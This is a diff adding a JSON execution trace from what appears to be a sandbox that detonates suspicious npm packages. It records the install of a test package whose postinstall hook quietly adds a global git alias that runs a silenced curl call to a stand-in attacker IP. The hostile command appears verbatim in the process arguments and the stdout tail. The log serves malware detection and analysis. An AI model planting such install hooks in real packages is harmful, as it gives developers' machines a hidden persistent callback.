@@ -1,0 +1,83 @@
+{
+ "job_id": "1a3cc55a-1346-4d6e-87c6-50d56856edf1",
+ "status": "completed",
+ "exit_code": 0,
+ "duration_s": 2.92,
+ "exec_events": [
+  {
+   "ts": "2026-11-03T22:30:28.156891439Z",
+   "pid": 286464,
+   "ppid": 286441,
+   "binary": "/usr/local/bin/docker-entrypoint.sh",
+   "args": "/usr/local/bin/docker-entrypoint.sh /bin/sh -c \"/bin/true pre-278892bc6734d317; \"$@\"; rc=$?; /bin/true post-278892bc6734d317; exit $rc\" detonator-witness npm install --no-audit --no-fund --prefix payloads/bc04-git-alias",
+   "parent_binary": "/usr/bin/containerd-shim-runc-v2",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:30:28.160241317Z",
+   "pid": 286504,
+   "ppid": 286464,
+   "binary": "/usr/local/bin/npm",
+   "args": "node /usr/local/bin/npm install --no-audit --no-fund --prefix payloads/bc04-git-alias",
+   "parent_binary": "/bin/sh",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:30:28.160927597Z",
+   "pid": 286504,
+   "ppid": 286504,
+   "binary": "/usr/local/bin/node",
+   "args": "/usr/local/bin/npm install --no-audit --no-fund --prefix payloads/bc04-git-alias",
+   "parent_binary": "/usr/local/bin/npm",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:30:28.619424723Z",
+   "pid": 286523,
+   "ppid": 286504,
+   "binary": "/usr/bin/sh",
+   "args": "-c \"git config --global alias.pull-stats '!curl -s -m 3 http://192.0.2.30/s >/dev/null 2>&1' || true\"",
+   "parent_binary": "/usr/local/bin/node",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc04-git-alias"
+  },
+  {
+   "ts": "2026-11-03T22:30:28.620623956Z",
+   "pid": 286524,
+   "ppid": 286523,
+   "binary": "/usr/bin/git",
+   "args": "config --global alias.pull-stats \"!curl -s -m 3 http://192.0.2.30/s >/dev/null 2>&1\"",
+   "parent_binary": "/usr/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc04-git-alias"
+  }
+ ],
+ "connect_events": [],
+ "dns_queries": [],
+ "file_events": [
+  {
+   "ts": "2026-11-03T22:30:28.279325829Z",
+   "pid": 286504,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.npmrc"
+  }
+ ],
+ "executed_scripts": [],
+ "decoys": {},
+ "stdout_tail": "\n> bc04@1.0.0 postinstall\n> git config --global alias.pull-stats '!curl -s -m 3 http://192.0.2.30/s >/dev/null 2>&1' || true\n\n\nup to date in 365ms\n",
+ "stderr_tail": "",
+ "truncated": false,
+ "error": null,
+ "sensor": {
+  "pre_seen": true,
+  "post_seen": true
+ },
+ "resources": {
+  "cpu_s": 0.06,
+  "peak_memory_mb": 4.5,
+  "samples": 1
+ }
+}
